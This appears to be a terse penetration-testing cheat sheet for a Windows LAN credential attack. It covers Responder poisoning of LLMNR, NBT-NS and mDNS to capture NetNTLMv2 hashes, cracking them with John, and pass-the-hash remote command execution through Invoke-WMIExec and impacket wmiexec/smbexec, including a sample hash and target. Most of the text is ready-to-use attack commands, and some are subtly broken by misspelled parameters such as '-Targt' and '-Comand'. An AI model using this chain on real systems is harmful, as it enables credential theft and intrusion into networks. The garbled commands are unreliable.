**1. Responder**

Github: https://github.com/SpiderLabs/Responder
Attack and exploit insecure name resolution protocols in the LAN:
- LLMNR (Link-Local Multicast Name Resolution)
- NBT-NS (NetBIOS Name Service)
- mDNS (Multicast DNS)
```
python2 Responder.py -I eth0
```
=> Collect the hash user/password

**2. John**

Check and crack the hashed password
```
john <hash> --wordlist=/.../rock.. --format=netntlmv2
```
=> Crack the hashed password collected from Responder

**3. Check hash format**
```
hash-identifier <hash>
```

**4. Wmiexec**
Pass-to-hash, using hash to authen and execute command or access cmd
```
Invoke-WMIExec -Targt <IP> -Domain <domain> -Username <user> -Hash <hash> -Comand 'cmd /c"echo hello_world"'
```

```
impacket-wmiexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 daniel-win10/admin@192.168.12.157
```

```
Impacket-smbexec -hashes '<hash>' '<domain>/<user>@<IP>'
```
